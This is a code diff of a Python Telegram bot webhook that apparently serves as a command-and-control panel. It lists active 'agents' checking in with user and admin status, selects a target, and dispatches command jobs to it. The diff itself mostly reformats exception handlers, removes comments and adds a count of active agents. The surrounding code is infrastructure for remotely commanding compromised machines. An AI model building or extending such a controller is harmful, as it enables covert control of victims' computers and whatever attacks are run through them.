@@ -1,5 +1,5 @@
 # api/index.py
-# FINAL VERSION - Added /list command and webhook security
+# FINAL VERSION - With all commands and security features
 
 import os
 import re
@@ -40,16 +40,14 @@ async def get_state():
             res = await client.get(STATE_URL, timeout=5)
             res.raise_for_status()
             return res.json().get("selected_target", None)
-        except Exception:
-            return None
+        except Exception: return None
 
 async def set_state(target_id):
     """Writes the new selected_target asynchronously."""
     async with httpx.AsyncClient() as client:
         try:
             await client.post(STATE_URL, json={"selected_target": target_id}, timeout=5)
-        except Exception as e:
-            print(f"Error setting state: {e}")
+        except Exception as e: print(f"Error setting state: {e}")
 
 async def post_job(target_id, command, args):
     """Posts a new command job asynchronously."""
@@ -123,13 +121,13 @@ async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
         active_agents = []
         now = time.time()
         for agent in agents:
-            # Consider agents active if they checked in within the last 60 seconds
             if now - agent.get("timestamp", 0) < 60:
                 active_agents.append(agent)
         
         if not active_agents:
             message += "_No active agents found\\._"
         else:
+            message += f"Found {len(active_agents)} active agent(s):\n\n"
             for agent in active_agents:
                 is_admin_text = "Admin" if agent.get('is_admin') else "User"
                 agent_user = agent.get('user', 'N/A')
@@ -138,7 +136,6 @@ async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
         message = f"❌ Error fetching agent list: `{esc(str(e))}`"
 
     await update.message.reply_text(message, parse_mode='MarkdownV2')
-
 
 async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
     target_id = " ".join(context.args).lower() if context.args else None
@@ -181,7 +178,6 @@ async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_
         await update.message.reply_text("❌ Error: Failed to dispatch job\\.")
 
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Logs the error."""
     print(f"An exception was raised while handling an update: {context.error}")
     tb_list = traceback.format_exception(None, context.error, context.error.__traceback__)
     tb_string = "".join(tb_list)
@@ -206,10 +202,8 @@ async def process_update_async(update_data):
 
 @app.route('/', methods=['POST'])
 def process_webhook():
-    # SECURE THE WEBHOOK
     if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN:
         return 'Unauthorized', 403
-    
     update_data = request.get_json(force=True)
     asyncio.run(process_update_async(update_data))
     return 'OK', 200
